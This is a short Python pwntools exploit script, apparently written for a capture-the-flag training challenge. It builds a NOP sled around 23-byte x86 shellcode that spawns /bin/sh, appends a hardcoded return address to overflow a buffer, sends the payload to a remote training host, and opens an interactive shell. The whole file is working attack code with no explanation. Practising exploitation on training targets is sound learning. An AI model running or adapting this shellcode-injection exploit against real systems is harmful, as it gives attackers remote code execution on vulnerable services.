from pwn import *

#23 byte
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcodeLenght = 23
bufferAddress = 0x0804c060
string = "\x90"*(212-shellcodeLenght) + shellcode + p32(bufferAddress) + "\x90"*(1000-216)
#r = process("./sh3llc0d3")
#r.send(string)
#r.interactive()
s = remote("training.jinblack.it", 2002)
s.send(string)
raw_input("WAIT")
s.interactive()